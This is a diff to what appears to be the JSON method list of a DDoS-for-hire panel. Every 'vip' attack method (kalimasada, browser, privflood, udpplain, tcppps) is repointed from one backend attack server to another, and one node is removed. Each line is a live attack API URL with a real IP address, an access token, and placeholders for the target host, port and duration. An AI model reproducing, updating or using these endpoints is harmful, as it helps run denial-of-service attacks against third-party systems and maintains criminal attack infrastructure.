@@ -6,7 +6,7 @@
       "vip"
     ],
     "api": [
-      "http://139.162.17.179:522/attack?token=malasahjago&target=<<$host>>&time=<<$time>>&method=kalimasada&port=<<$port>>&slot="
+      "http://38.58.180.135:3083/attack?token=malasahjago&target=<<$host>>&time=<<$time>>&method=kalimasada&port=<<$port>>&slot="
     ]
   },
   {
@@ -16,8 +16,7 @@
       "vip"
     ],
     "api": [
-      "http://139.162.17.179:522/attack?token=malasahjago&target=<<$host>>&time=<<$time>>&method=browser&port=<<$port>>&slot=",
-      "http://node68.lunes.host:3119/attack?token=nn&target=<<$host>>&time=<<$time>>"
+      "http://38.58.180.135:3083/attack?token=malasahjago&target=<<$host>>&time=<<$time>>&method=browser&port=<<$port>>&slot="
     ]
   },
   {
@@ -27,7 +26,7 @@
       "vip"
     ],
     "api": [
-      "http://139.162.17.179:522/attack?token=malasahjago&target=<<$host>>&time=<<$time>>&method=privflood&port=<<$port>>&slot="
+      "http://38.58.180.135:3083/attack?token=malasahjago&target=<<$host>>&time=<<$time>>&method=privflood&port=<<$port>>&slot="
     ]
   },
   {
@@ -37,7 +36,7 @@
       "vip"
     ],
     "api": [
-      "http://139.162.17.179:522/attack?token=malasahjago&target=<<$host>>&time=<<$time>>&method=udpplain&port=<<$port>>&slot="
+      "http://38.58.180.135:3083/attack?token=malasahjago&target=<<$host>>&time=<<$time>>&method=udpplain&port=<<$port>>&slot="
     ]
   },
   {
@@ -47,7 +46,7 @@
       "vip"
     ],
     "api": [
-      "http://139.162.17.179:522/attack?token=malasahjago&target=<<$host>>&time=<<$time>>&method=tcppps&port=<<$port>>&slot="
+      "http://38.58.180.135:3083/attack?token=malasahjago&target=<<$host>>&time=<<$time>>&method=tcppps&port=<<$port>>&slot="
     ]
   }
 ]
